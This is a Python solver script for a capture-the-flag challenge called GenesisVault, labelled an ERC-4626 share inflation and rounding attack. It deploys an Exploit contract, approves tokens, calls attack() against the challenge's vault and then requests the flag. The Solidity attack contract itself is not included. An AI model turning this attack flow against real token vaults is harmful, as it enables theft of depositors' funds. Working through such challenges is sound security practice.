#!/usr/bin/env python3
"""
GenesisVault Exploit Solver (H7CTF)
ERC-4626 Share Inflation / Rounding Attack
"""

import sys
import os
import re
import json
import argparse
import requests
import solcx
from web3 import Web3
from eth_account import Account

sys.path.insert(0, os.getcwd())

SOL_FILES = [
    "solutions/genesis_vault/Token.sol",
    "solutions/genesis_vault/GenesisVault.sol",
    "solutions/genesis_vault/Setup.sol",
    "solutions/genesis_vault/Exploit.sol",
]

def parse_target_info(target_file="traget.txt"):
    # Check if target_file exists and has content
    for candidate in [target_file, "target.txt", "../traget.txt", "../target.txt", "C:/Users/USER/OneDrive/Desktop/ctf/traget.txt"]:
        if os.path.exists(candidate) and os.path.getsize(candidate) > 0:
            with open(candidate, "r") as f:
                content = f.read().strip()
                if content:
                    return content
    return None

def compile_contracts():
    print("[*] Compiling contracts using solc 0.8.24...")
    compiled = solcx.compile_files(
        SOL_FILES,
        solc_version="0.8.24",
        output_values=["abi", "bin"]
    )
    return compiled

def run_exploit(w3, setup_addr, private_key, chain_id=31337):
    account = Account.from_key(private_key)
    player = account.address
    print(f"[+] Player address: {player}")
    print(f"[+] Player balance: {w3.from_wei(w3.eth.get_balance(player), 'ether')} ETH")

    compiled = compile_contracts()
    setup_abi = compiled["solutions/genesis_vault/Setup.sol:Setup"]["abi"]
    setup = w3.eth.contract(address=setup_addr, abi=setup_abi)

    token_addr = setup.functions.token().call()
    vault_addr = setup.functions.vault().call()
    print(f"[+] Token: {token_addr}")
    print(f"[+] Vault: {vault_addr}")
    print(f"[*] Initial isSolved: {setup.functions.isSolved().call()}")

    token_abi = compiled["solutions/genesis_vault/Token.sol:Token"]["abi"]
    token = w3.eth.contract(address=token_addr, abi=token_abi)
    vault_abi = compiled["solutions/genesis_vault/GenesisVault.sol:GenesisVault"]["abi"]
    vault = w3.eth.contract(address=vault_addr, abi=vault_abi)

    player_token_bal = token.functions.balanceOf(player).call()
    print(f"[+] Player initial token balance: {w3.from_wei(player_token_bal, 'ether')} gUSD")

    # Step 1: Deploy Exploit contract
    print("\n[*] Deploying Exploit contract...")
    exploit_iface = compiled["solutions/genesis_vault/Exploit.sol:Exploit"]
    exploit_factory = w3.eth.contract(abi=exploit_iface["abi"], bytecode=exploit_iface["bin"])

    nonce = w3.eth.get_transaction_count(player)
    deploy_tx = exploit_factory.constructor(setup_addr).build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 2_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(deploy_tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    exploit_addr = receipt.contractAddress
    print(f"[+] Exploit contract deployed at: {exploit_addr}")

    # Step 2: Approve Exploit to pull (100 ether + 1)
    needed = w3.to_wei(100, "ether") + 1
    print(f"[*] Approving Exploit for {w3.from_wei(needed, 'ether')} gUSD...")
    nonce += 1
    approve_tx = token.functions.approve(exploit_addr, needed).build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 100_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(approve_tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("[+] Approval confirmed")

    # Step 3: Trigger Exploit.attack()
    print("[*] Executing attack() transaction...")
    exploit = w3.eth.contract(address=exploit_addr, abi=exploit_iface["abi"])
    nonce += 1
    attack_tx = exploit.functions.attack().build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 1_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(attack_tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Attack confirmed in block {receipt.blockNumber}, gas used: {receipt.gasUsed}")

    # Step 4: Verify solved status
    is_solved = setup.functions.isSolved().call()
    print(f"\n[+] Setup.isSolved(): {is_solved}")
    return is_solved

def main():
    parser = argparse.ArgumentParser(description="GenesisVault solver")
    parser.add_argument("--url", help="Web instance or RPC URL")
    parser.add_argument("--setup", help="Setup contract address")
    parser.add_argument("--pk", help="Player private key")
    args = parser.parse_args()

    target_content = parse_target_info()
    url = args.url
    setup_addr = args.setup
    pk = args.pk

    if target_content:
        # Check if target_content is JSON or URL
        if target_content.startswith("http"):
            url = target_content.split()[0]
        try:
            data = json.loads(target_content)
            url = data.get("rpc") or data.get("url") or url
            setup_addr = data.get("setup") or setup_addr
            pk = data.get("private_key") or data.get("pk") or pk
        except Exception:
            pass

    if not url:
        print("[!] No live target URL found in traget.txt.")
        print("[*] Running local EVM verification test instead...")
        from solutions.genesis_vault.test_local import main as run_local
        run_local()
        return

    # If live URL provided, scrape or connect
    print(f"[*] Target URL: {url}")
    try:
        resp = requests.get(url, timeout=5)
        html = resp.text
        # Look for RPC, Setup address, Private key patterns
        if not setup_addr:
            m_setup = re.search(r"0x[a-fA-F0-9]{40}", html)
            if m_setup:
                setup_addr = m_setup.group(0)
        if not pk:
            m_pk = re.search(r"0x[a-fA-F0-9]{64}", html)
            if m_pk:
                pk = m_pk.group(0)
    except Exception as e:
        print(f"[-] Could not fetch web info: {e}")

    w3 = Web3(Web3.HTTPProvider(url))
    if not w3.is_connected():
        print(f"[-] Could not connect to Web3 provider at {url}")
        return

    if not setup_addr or not pk:
        print("[-] Missing Setup address or Private Key. Please provide --setup and --pk")
        return

    solved = run_exploit(w3, setup_addr, pk)
    if solved:
        flag_url = url.rstrip("/") + "/flag"
        print(f"[*] Requesting flag from {flag_url}...")
        resp = requests.get(flag_url)
        print(f"[+] Server response: {resp.text}")

if __name__ == "__main__":
    main()
